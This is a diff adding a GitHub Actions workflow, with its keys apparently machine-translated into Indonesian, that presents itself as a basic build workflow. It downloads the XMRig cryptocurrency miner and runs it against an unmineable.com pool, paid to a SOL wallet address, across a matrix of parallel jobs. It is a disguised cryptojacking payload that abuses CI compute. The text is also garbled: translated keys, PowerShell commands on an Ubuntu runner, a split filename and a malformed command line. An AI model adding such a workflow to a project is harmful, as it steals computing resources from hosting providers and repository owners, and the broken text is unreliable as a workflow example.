@@ -1,0 +1,28 @@
+# This is a basic workflow to help you get started with Actions
+
+nama : epan.yml
+ 
+pada : [alur kerja_dispatch]
+ 
+pekerjaan :
+  membangun :
+    nama : epand
+    berjalan-on : ubuntu-terbaru
+    strategi :
+      paralel maks : 5
+      gagal-cepat : salah
+      matriks :
+        pergi : [1.0, 1.1, 1.2, 1.3, 1,35]
+        bendera : [A, B, C, D, E, F, G, H, I]
+    env :
+        NUM_JOBS : 20
+        PEKERJAAN : ${{ matrix.go }}
+    langkah-langkah :
+    - nama : PERSIAPAN
+      jalankan : Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar -xf xmrig-6.16.4-linux- x64.tar.gz
+    - nama : Setting-UP
+      jalankan : Expand-Archive xmrig-6.16.4-linux-x64.tar.gz
+    - nama : Lari
+      jalankan : ./xmrig.rx.unmineable.com:3333 -px -a rx -k -t 1 --cpu-max-threads-hint 25 -u SOL:uoXJ2QnaxJkVwNJrGGyyCiyGEhK27JyWHHMURUsfxWR.ep
+    - nama : SELESAI
+      lari : keluar
